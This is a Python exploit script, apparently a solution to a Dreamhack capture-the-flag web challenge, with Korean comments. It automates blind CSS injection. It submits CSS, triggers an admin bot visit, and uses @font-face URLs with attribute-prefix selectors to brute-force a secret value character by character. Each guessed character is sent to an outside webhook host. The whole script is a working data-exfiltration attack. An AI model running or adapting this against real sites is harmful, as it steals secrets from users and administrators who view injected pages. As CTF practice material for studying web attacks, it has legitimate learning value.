import requests
import time
import urllib.parse

TARGET_URL = "http://host8.dreamhack.games:20570"
# ⚠️ 주의: 반드시 드림핵 툴즈에서 '새로 발급받은' 주소로 변경하세요!
WEBHOOK_URL = "https://skvzhmr.request.dreamhack.games"

CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-!@#$%^&*()}"
CHUNK_SIZE = 15

def send_payload(css_payload, description=""):
    print(f"\n[DEBUG] ----------------------------------------------------")
    print(f"[DEBUG] 🚀 페이로드 전송: {description}")
    print(f"[DEBUG] 전송할 CSS 총 길이: {len(css_payload)} bytes")
    
    submit_url = f"{TARGET_URL}/submit"
    res_submit = requests.post(submit_url, data={"css": css_payload}, allow_redirects=False)
    
    location = res_submit.headers.get("Location", "")
    
    if "/view/" not in location:
        print(f"[DEBUG] ❌ [에러] CSS 제출 실패! (Location: {location})")
        return False

    idx = location.split("/")[-1]
    print(f"[DEBUG] 📌 부여받은 리포트 idx: {idx}")

    report_url = f"{TARGET_URL}/report/{idx}"
    res_report = requests.post(report_url)
    
    if res_report.status_code in [200, 302]:
        print(f"[DEBUG] ✅ 관리자 봇 방문 트리거 성공! (상태 코드: {res_report.status_code})")
        return True
    else:
        print(f"[DEBUG] ❌ [에러] 봇 방문 트리거 실패! 상태 코드: {res_report.status_code}")
        return False

if __name__ == "__main__":
    print("\n[DEBUG] ====================================================")
    print("[DEBUG] 🔥 Blind CSS Injection (@font-face 우회 기법) 🔥")
    print("[DEBUG] ====================================================")

    # [1단계] 조건 없는 연결 테스트 (배경 이미지 대신 폰트 다운로드 강제 유도)
    print("\n[DEBUG] [1단계] 조건 없는 연결 테스트 (웹훅 작동 검증)")
    test_css = f"""
    @font-face {{
        font-family: 'TestFont';
        src: url('{WEBHOOK_URL}/?test=font_fetch_working');
    }}
    body {{
        font-family: 'TestFont';
    }}
    """
    send_payload(test_css, "웹훅 연결 테스트 (폰트)")
    print("[DEBUG] ⏳ 봇 응답 대기 (2초)...")
    time.sleep(2)

    # [2단계] 브루트포스 페이로드 전송
    print("\n[DEBUG] [2단계] CHARSET 기반 브루트포스 페이로드 전송")
    known_flag = "DH{"
    print(f"[DEBUG] 🎯 현재 타겟 플래그 접두사: {known_flag}")
    
    chunks = [CHARSET[i:i + CHUNK_SIZE] for i in range(0, len(CHARSET), CHUNK_SIZE)]
    print(f"[DEBUG] 🧩 총 {len(chunks)}개의 청크로 분할되었습니다. (청크당 {CHUNK_SIZE}글자)")

    for chunk_idx, chunk in enumerate(chunks):
        css_payload = ""
        print(f"\n[DEBUG] 👉 청크 {chunk_idx + 1}/{len(chunks)} 처리 중... (문자: {chunk})")
        
        for char in chunk:
            test_val = known_flag + char
            encoded_val = urllib.parse.quote(test_val)
            
            # 각 문자마다 고유한 폰트를 정의하고, 해당 조건이 맞을 때만 폰트를 적용하도록 설정
            css_payload += f"""
            @font-face {{
                font-family: 'Font_{encoded_val}';
                src: url('{WEBHOOK_URL}/?found={encoded_val}');
            }}
            input[data-secret^='{test_val}'] {{
                font-family: 'Font_{encoded_val}';
            }}
            """
        
        send_payload(css_payload, f"청크 {chunk_idx + 1} 공격")
        print("[DEBUG] ⏳ 봇 응답 대기 (2초)...")
        time.sleep(2)

    print("\n[DEBUG] ====================================================")
    print("[DEBUG] 🏁 스크립트 실행 완료!")
    print("[DEBUG] 드림핵 툴즈에 /?test=font_fetch_working 이 찍혔는지 먼저 확인하세요.")
    print("[DEBUG] ====================================================")